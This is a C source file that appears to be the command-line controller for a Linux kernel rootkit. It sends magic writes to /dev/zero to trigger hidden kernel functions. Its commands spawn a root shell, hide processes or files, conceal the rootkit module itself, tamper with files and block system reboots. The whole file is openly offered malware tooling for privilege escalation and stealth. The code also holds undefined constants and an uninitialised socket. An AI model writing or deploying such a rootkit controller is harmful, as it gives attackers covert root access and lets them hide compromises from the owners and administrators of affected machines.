#include <arpa/inet.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define SHELL "/bin/bash"
#define zero "/dev/zero"

int main(int argc, char **argv)
{
	int sockfd;
	//struct control args;
	struct sockaddr_in addr;
	struct hostent *host;
	unsigned int pid;
	char *bash = SHELL;
	char *envp[1] = {NULL};
	char *arg[3] = {SHELL, NULL};
	char write_zero[20];
	char zero_write[20];
	char to_write[256];

	if (argc < 2)
		exit(0);

	int fd = open("/dev/zero", O_RDWR);
	if (fd == -1) {
        perror("Error opening /dev/zero");
        exit(EXIT_FAILURE);
    }

	sprintf(write_zero, "%d", WRITE_ZERO);
	sprintf(zero_write, "%d", ZERO_WRITE);

	if (strcmp(argv[1], "root") == 0) {
		if (geteuid() == 0) {
			printf("You are already root!!!\n\n");
			close(sockfd);
			goto out;
		}

		// Prepare magic call ( set control )
		explicit_bzero(to_write, strlen(to_write));
		strcpy(to_write, write_zero);
		strcat(to_write, " ");
    	strcat(to_write, zero_write);

		if (write(fd, to_write, strlen(to_write)) == 2023) {
			
			//send cmd
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
    		strcat(to_write, " 4 ");
			if (write(fd, to_write, strlen(to_write)) == 2023) printf("OKK");

			// unset control
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
			strcat(to_write, " ");
			strcat(to_write, zero_write);
			write(fd, to_write, strlen(to_write));
		}

		if (geteuid() == 0) {
			printf("\e[01;36mYou are now root!\e[00m\n\n");
			execve(bash, arg, envp);
		} else {
			printf("\e[00;31mNo root :( \e[00m\n\n");
		}

		goto out;
	}

	if (strcmp(argv[1], "hide") == 0 || strcmp(argv[1], "show") == 0) {
		if (argc < 2)
			goto fail;

		if (argc == 2) {
			// Prepare magic call ( set control )
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
			strcat(to_write, " ");
			strcat(to_write, zero_write);
			if (write(fd, to_write, strlen(to_write)) == 2023) {
				//send cmd
				explicit_bzero(to_write, strlen(to_write));
				strcpy(to_write, write_zero);
				strcat(to_write, " 1 ");
				if (write(fd, to_write, strlen(to_write)) == 2023) {
					explicit_bzero(to_write, strlen(to_write));
					strcpy(to_write, write_zero);
					strcat(to_write, " ");
					strcat(to_write, zero_write);
					// unset control
					if (write(fd, to_write, strlen(to_write)) == 2023) {
						printf("\e[01;32mCommand succeded!\e[00m\n");
						goto out;
					}
				}	
			}
		} 
		else {
			// Prepare magic call ( set control )
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
			strcat(to_write, " ");
			strcat(to_write, zero_write);
			if (write(fd, to_write, strlen(to_write)) == 2023) {
				//send cmd
				explicit_bzero(to_write, strlen(to_write));
				strcpy(to_write, write_zero);
				strcat(to_write, " 1 ");
				strcat(to_write, argv[2]);
				if (write(fd, to_write, strlen(to_write)) == 2023) {
					explicit_bzero(to_write, strlen(to_write));
					strcpy(to_write, write_zero);
					strcat(to_write, " ");
					strcat(to_write, zero_write);
					// unset control
					if (write(fd, to_write, strlen(to_write)) == 2023) {
						printf("\e[01;32mCommand succeded!\e[00m\n");
						goto out;
					}
				}	
			}
		}
	}


	if (strcmp(argv[1], "hide_mod") == 0) {
		if (argc < 2)
			goto fail;

		// Prepare magic call ( set control )
		explicit_bzero(to_write, strlen(to_write));
		strcpy(to_write, write_zero);
		strcat(to_write, " ");
		strcat(to_write, zero_write);
		if (write(fd, to_write, strlen(to_write)) == 2023) {
			//send cmd
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
			strcat(to_write, " 0 ");
			if (write(fd, to_write, strlen(to_write)) == 2023) {
				explicit_bzero(to_write, strlen(to_write));
				strcpy(to_write, write_zero);
				strcat(to_write, " ");
				strcat(to_write, zero_write);
				// unset control
				if (write(fd, to_write, strlen(to_write)) == 2023) {
					printf("\e[01;32m Hide and then hide modules otherwise it will not work!\e[00m\n");
					printf("\e[01;32mCommand succeded!\e[00m\n");
					goto out;
				}
			}	
		}
	}

	if (strcmp(argv[1], "file-tampering") == 0) {
		if (argc < 2)
			goto fail;

		// Prepare magic call ( set control )
		explicit_bzero(to_write, strlen(to_write));
		strcpy(to_write, write_zero);
		strcat(to_write, " ");
		strcat(to_write, zero_write);
		if (write(fd, to_write, strlen(to_write)) == 2023) {
			//send cmd
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
			strcat(to_write, " 2 ");
			if (write(fd, to_write, strlen(to_write)) == 2023) {
				explicit_bzero(to_write, strlen(to_write));
				strcpy(to_write, write_zero);
				strcat(to_write, " ");
				strcat(to_write, zero_write);
				// unset control
				if (write(fd, to_write, strlen(to_write)) == 2023) {
					printf("\e[01;32mCommand succeded!\e[00m\n");
					goto out;
				}
			}	
		}
	}

	if (strcmp(argv[1], "no_OWD") == 0) {
		if (argc < 2)
			goto fail;

		// Prepare magic call ( set control )
		explicit_bzero(to_write, strlen(to_write));
		strcpy(to_write, write_zero);
		strcat(to_write, " ");
		strcat(to_write, zero_write);
		if (write(fd, to_write, strlen(to_write)) == 2023) {
			//send cmd
			explicit_bzero(to_write, strlen(to_write));
			strcpy(to_write, write_zero);
			strcat(to_write, " 3 ");
			if (write(fd, to_write, strlen(to_write)) == 2023) {
				explicit_bzero(to_write, strlen(to_write));
				strcpy(to_write, write_zero);
				strcat(to_write, " ");
				strcat(to_write, zero_write);
				// unset control
				if (write(fd, to_write, strlen(to_write)) == 2023) {
					printf("\e[01;32mCommand succeded!\e[00m\n");
					printf("\e[01;32mBe carreful using this, it will probably prevent machine reboot !!\e[00m\n");
					goto out;
				}
			}	
		}
	}

fail:
	printf("\e[01;31mFailed!\e[00m\n");
out:
	//close(sockfd);
	return 0;
}
